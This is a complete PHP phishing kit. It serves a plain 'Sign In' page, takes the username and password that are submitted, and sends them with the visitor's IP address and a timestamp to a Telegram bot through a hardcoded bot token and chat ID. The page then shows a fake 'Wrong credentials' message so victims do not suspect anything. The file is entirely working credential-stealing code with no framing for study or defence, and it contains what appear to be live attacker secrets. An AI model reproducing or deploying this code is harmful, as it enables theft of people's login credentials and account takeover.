<?php
// ==== TELEGRAM CONFIG ====
$TOKEN    = "8146877130:AAETaFmSH5Sx-UPSwtFOsNPkJSR8pf3ZXJw";
$CHAT_ID  = "5279025133";

function sendTelegram($msg) {
    global $TOKEN, $CHAT_ID;
    $url = "https://api.telegram.org/bot$TOKEN/sendMessage";
    $data = ['chat_id' => $CHAT_ID, 'text' => $msg, 'parse_mode' => 'HTML'];
    file_get_contents($url . '?' . http_build_query($data));
}

// ==== POST → send to Telegram ====
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    $user = trim($_POST['username'] ?? '');
    $pass = trim($_POST['password'] ?? '');
    $ip   = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');

    $txt = "New Hit\nTime: $time\nIP: $ip\nUsername: $user\nPassword: $pass";
    sendTelegram(preg_replace('/\n/', "%0A", $txt));   // works even without cURL

    echo json_encode(['success'=>false, 'message'=>'Wrong credentials']);
    exit;
}

// ==== GET → show login form ====
?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Sign In</title>
<style>body{font-family:Arial;max-width:380px;margin:60px auto;background:#f9f9f9;padding:20px;}
input,button{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #ccc;box-sizing:border-box;}
button{background:#007bff;color:#fff;font-size:16px;border:none;cursor:pointer;}</style>
</head><body>
<h1>Sign In</h1>
<form id="f">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>
<script>
document.getElementById('f').onsubmit=async e=>{
e.preventDefault();
let d=new FormData(e.target);
let r=await fetch('',{method:'POST',body:d});
let j=await r.json();
alert(j.message);
};
</script>
</body></html>
